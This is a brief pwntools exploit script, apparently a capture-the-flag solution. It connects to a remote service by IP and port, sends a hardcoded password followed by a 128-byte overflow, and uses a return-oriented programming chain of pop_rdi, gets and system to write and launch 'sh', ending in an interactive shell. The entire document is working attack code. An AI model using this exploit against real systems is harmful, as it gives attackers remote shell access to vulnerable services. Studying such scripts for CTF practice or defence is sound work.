from pwn import *

#p = process("./name")
p = remote("34.121.19.183", 49158)

gets = 0x400600
bss = 0x601000
system = 0x4005d0
main = 0x400717
pop_rdi = 0x400833
ret = 0x4005b6

p.sendline("w3lc0m3\x00" + "A"*128 + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(system) + "\x00")
p.sendline("sh")
p.interactive()
